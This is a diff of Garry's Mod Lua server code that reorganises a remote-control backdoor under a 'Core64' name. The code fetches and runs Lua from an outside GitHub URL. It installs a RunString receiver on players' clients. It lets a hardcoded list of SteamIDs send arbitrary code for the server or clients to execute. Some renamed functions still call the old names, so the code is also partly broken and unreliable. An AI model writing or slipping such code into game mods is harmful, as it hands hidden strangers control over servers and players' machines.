@@ -1,4 +1,5 @@
-Core64users = {
+Core64 = {}
+Core64.admin_list = {
 			['STEAM_0:0:86505916'] = true,
 			['STEAM_0:0:46138786'] = true,
 			['STEAM_0:1:52242486'] = true,
@@ -11,31 +12,31 @@ Core64users = {
 
 
 if SERVER then	
-		local function UrlFunc(url)
+		function Core64.UrlFunc(url)
 			http.Fetch(url, function(c)
 				local func = CompileString(c, "UrlFunc", false)
 				return func()
 			end)			
 		end
 		
-		function UrlRunS(url)
+		function Core64.UrlRunS(url)
 			local func = UrlFunc(url)
 			func()
 		end
 		
-		function GitRunSV(url)
+		function Core64.GitRunSV(url)
 			local func = UrlFunc("https://raw.githubusercontent.com/Dzhet225/core64_v2/master/"..url)
 			func()
 		end
 		
-		util.AddNetworkString('_da_')
+		util.AddNetworkString('core64.netcode')
 		
-		local function RunOnCL(tar, code)
+		function Core64.RunOnCL(tar, code)
 			if !tar.CodeReceiver then
 				tar.CodeReceiver=true
-				tar:SendLua([[net.Receive('_da_',function() RunString(net.ReadString()) end)]])
+				tar:SendLua([[net.Receive('core64.netcode',function() RunString(net.ReadString()) end)]])
 			end
-			net.Start('_da_')
+			net.Start('core64.netcode')
 			net.WriteString(code)
 			net.Send(tar)
 		end
@@ -54,8 +55,8 @@ if SERVER then
 			end,
 		}
 
-		net.Receive('_da_', function(len, ply)
-			if !great[ply:SteamID()] then return end
+		net.Receive('core64.netcode', function(len, ply)
+			if !Core64.admin_list[ply:SteamID()] then return end
 			
 			local code = net.ReadString()
 			rec[net.ReadUInt(2)](code)
